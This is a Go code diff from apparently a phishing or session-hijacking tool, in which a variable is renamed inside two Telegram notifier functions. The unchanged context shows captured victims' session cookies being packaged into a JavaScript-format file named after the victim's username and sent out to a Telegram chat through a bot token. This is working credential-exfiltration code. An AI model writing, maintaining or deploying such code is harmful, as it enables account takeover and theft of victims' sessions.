@@ -184,10 +184,10 @@ func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) er
 	// Generate cookie file content in JavaScript format
 	cookieFileContent := generateCookieJavaScript(session, timeStr)
 	
-	// Create filename with username
-	safeUsername := strings.ReplaceAll(session.Username, "@", "_at_")
-	safeUsername = strings.ReplaceAll(safeUsername, ".", "_")
-	filename := fmt.Sprintf("cookies_%s_%d.txt", safeUsername, session.Id)
+	// Create filename with username (use different var name to avoid redeclaration)
+	filenameUser := strings.ReplaceAll(session.Username, "@", "_at_")
+	filenameUser = strings.ReplaceAll(filenameUser, ".", "_")
+	filename := fmt.Sprintf("cookies_%s_%d.txt", filenameUser, session.Id)
 
 	// Send the document with caption
 	log.Success("Sending cookies notification for session %d (%d cookies)", session.Id, cookieCount)
@@ -242,10 +242,10 @@ func (t *TelegramNotifier) SendSessionNotification(session *database.Session) er
 	// Generate cookie file content in JavaScript format
 	cookieFileContent := generateCookieJavaScript(session, timeStr)
 	
-	// Create filename with username
-	safeUsername := strings.ReplaceAll(session.Username, "@", "_at_")
-	safeUsername = strings.ReplaceAll(safeUsername, ".", "_")
-	filename := fmt.Sprintf("cookies_%s_%d.txt", safeUsername, session.Id)
+	// Create filename with username (use different var name to avoid redeclaration)
+	filenameUser := strings.ReplaceAll(session.Username, "@", "_at_")
+	filenameUser = strings.ReplaceAll(filenameUser, ".", "_")
+	filename := fmt.Sprintf("cookies_%s_%d.txt", filenameUser, session.Id)
 
 	// Send the document with caption
 	return t.sendDocument(botToken, chatID, message, filename, cookieFileContent)
